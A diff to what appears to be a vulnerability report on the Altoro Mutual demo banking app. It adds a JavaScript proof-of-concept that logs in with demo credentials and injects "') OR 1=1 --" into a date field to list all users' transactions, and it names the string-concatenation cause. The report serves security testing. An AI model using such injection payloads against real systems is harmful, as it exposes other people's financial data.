@@ -70,6 +70,36 @@ Report content:
   - Impact: list transactions of all users as an unauthorized user
   - Cause: DBUtil.getTransactions() method does string concatenation in SQL query
 
+- SQL injection
+  - Use the following script and observe how the API returns all of the transactions on the system:
+    username = 'jdoe';
+    password = 'demo1234';
+    res = await (
+      await fetch('/altoromutual/api/login', {
+        headers: { 'Content-Type': 'application/json' },
+        method: 'POST',
+        body: JSON.stringify({
+          username,
+          password
+        })
+      })
+    ).json();
+
+    auth = res.Authorization;
+
+    res = await (
+      await fetch('/altoromutual/api/account/800004/transactions', {
+        headers: { 'Content-Type': 'application/json', Authorization: auth },
+        method: 'POST',
+        body: JSON.stringify({
+          startDate: '2018-06-11',
+          endDate: "2018-06-11 23:59:59') OR 1=1 --"
+        })
+      })
+    ).json();
+  - Impact: list transactions of all users as an unauthorized user
+  - Cause: DBUtil.getTransactions() method does string concatenation in SQL query
+
 - Unauthorized file access
   - Go to "inside altoro" > 2006 community annual report
     - Replace the url after pr/ with Q3_earnings.rtf
